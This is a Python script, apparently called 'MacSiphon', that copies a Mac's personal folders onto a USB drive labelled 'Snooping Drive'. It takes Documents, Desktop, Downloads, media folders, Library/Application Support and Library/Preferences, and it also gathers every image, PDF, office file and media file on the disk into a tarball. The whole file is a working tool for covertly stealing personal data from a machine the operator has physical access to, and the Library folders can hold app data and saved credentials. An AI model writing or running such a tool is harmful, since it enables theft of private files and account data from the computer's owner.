import os
import shutil
import tarfile
import fnmatch

# __  __         ___ _      _             
#|  \/  |__ _ __/ __(_)_ __| |_  ___ _ _  
#| |\/| / _` / _\__ \ | '_ \ ' \/ _ \ ' \ 
#|_|  |_\__,_\__|___/_| .__/_||_\___/_||_|
#                     |_|                 

# Created by H3l!0s_T3k
# Date: 01\11\2024
# _______________________________________

# Set the USB drive path
usb_drive_path = "/Volumes/Snooping Drive"

# Set the Macintosh HD path
macintosh_hd_path = "/Volumes/Macintosh HD"

# Create a list of directories to extract
directories_to_extract = [
    "Documents",
    "Pictures",
    "Downloads",
    "Movies",
    "Music",
    "Desktop",
    "Library/Application Support",
    "Library/Preferences",
]

# Create a list of file types to extract
file_types_to_extract = [
    "*.jpg",
    "*.png",
    "*.pdf",
    "*.docx",
    "*.xlsx",
    "*.pptx",
    "*.mp3",
    "*.mp4",
]

def create_tarball(usb_drive_path, macintosh_hd_path, directories_to_extract, file_types_to_extract):
    tarball_file = os.path.join(usb_drive_path, "data.tar.gz")
    
    with tarfile.open(tarball_file, "w:gz") as tar:
        # Add selected folders to tarball
        for directory in directories_to_extract:
            dir_path = os.path.join(macintosh_hd_path, directory)
            if os.path.exists(dir_path):
                tar.add(dir_path, arcname=os.path.basename(directory))
        
        # Add files based on specified types
        for file_type in file_types_to_extract:
            for root, dirs, files in os.walk(macintosh_hd_path):
                for file in fnmatch.filter(files, file_type):
                    tar.add(os.path.join(root, file), arcname=os.path.relpath(os.path.join(root, file), macintosh_hd_path))

def copy_extracted_data(usb_drive_path, macintosh_hd_path, directories_to_extract):
    # Copy selected folders to USB
    for directory in directories_to_extract:
        src_path = os.path.join(macintosh_hd_path, directory)
        dest_path = os.path.join(usb_drive_path, directory)
        if os.path.exists(src_path):
            shutil.copytree(src_path, dest_path, dirs_exist_ok=True)

def main():
    # Check if USB is connected
    if os.path.exists(usb_drive_path):
        print("USB drive found. Extracting data...")
        create_tarball(usb_drive_path, macintosh_hd_path, directories_to_extract, file_types_to_extract)
        copy_extracted_data(usb_drive_path, macintosh_hd_path, directories_to_extract)
        print("Data extraction completed successfully:)")
    else:
        print("USB drive not found. Please ensure it is connected:(")

if __name__ == "__main__":
    main()
